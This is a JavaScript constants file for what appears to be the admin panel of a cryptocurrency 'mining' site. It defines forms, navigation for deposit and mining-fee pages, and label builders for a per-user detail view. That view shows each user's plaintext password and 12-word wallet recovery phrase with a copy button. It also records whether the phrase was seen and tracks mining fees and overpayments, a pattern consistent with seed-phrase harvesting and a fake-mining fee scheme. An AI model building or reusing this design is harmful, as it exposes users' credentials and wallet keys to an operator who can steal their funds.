export const authDetails = {
  email: "",
  password: "",
  confirmPassword: "",
};
export const authLoginDetails = {
  email: "",
  logpassword: "",
};

export const keyPhrase = {
  keyPhrase: "",
};

export const singleUserNav = [
  {
    path: "",
    element: "User Details",
  },
  {
    path: "/deposit",
    element: "Deposit Transaction",
  },
  {
    path: "/history",
    element: "Hsitory",
  },
  {
    path: "/mining-activated",
    element: "Mining Activated",
  },
  {
    path: "/earn",
    element: "Earn Buttons",
  },
  {
    path: "/deposit-mining-fee",
    element: "Mining Fee Deposit ",
  },
];

export const getUserInfo = (
  field,
  createdAt,
  copy,
  balance,
  phrase,
  pending
) => [
  {
    label: "ID",
    value: field?.id,
  },
  {
    label: "Email",
    value: field?.email,
  },
  {
    label: "Password",
    value: field?.pass,
  },
  {
    label: "12 Phrase",
    value: `${field?.phrase.slice(0, 20)}...`,
    copy: phrase,
  },
  {
    label: "Created At",
    value: createdAt,
  },
  {
    label: "Available Balance",
    value: `$${balance}`,
  },
  {
    label: "Transactions",
    value:
      field?.transactions?.length > 0
        ? `Transactions: ${field?.transactions?.length}`
        : "No Transaction Available",
    pend: pending ? "Pending" : "",
  },
  {
    label: "User",
    value: field?.isVerified ? "Log in" : "Log Out",
  },
  {
    label: "IsRegistered",
    value: field?.successRegistered ? "Registered" : "Not Registered",
  },
  {
    label: "Seen 12 Phrase",
    value: field?.backUpPhrase ? "Yes" : "No",
  },
  {
    label: "Mining Upgraded",
    value: field?.miningStarted ? "Mining Started" : "Mining Not Started",
  },
  {
    label: "Mining Keys",
    value: field?.miningKeys,
    copy: copy,
  },
];

export const getActivatedMining = (
  mininAct,
  field,
  mininFee,
  miniFeeResu,
  OverPaid
) => [
  {
    label: "Mining Activated",
    value: mininAct,
  },
  {
    label: "Coin Miner",
    value: field,
  },
  {
    label: "Mining Fee",
    value: mininFee,
  },
  {
    label: "Mining Fee Results",
    value: miniFeeResu,
  },
  {
    label: "Mining OverPaid",
    value: OverPaid,
  },
];

export const getActivatedMiningButton = (
  field,
  btn1,
  mininAct,
  btn2,
  mininFee,
  btn3
) => [
  {
    label: "Chart Started",
    value: field,
    button: btn1,
  },
  {
    label: "Mining Fee Paid",
    value: mininAct,
    button: btn2,
  },
  {
    label: "Over Mining Paid",
    value: mininFee,
    button: btn3,
  },
];
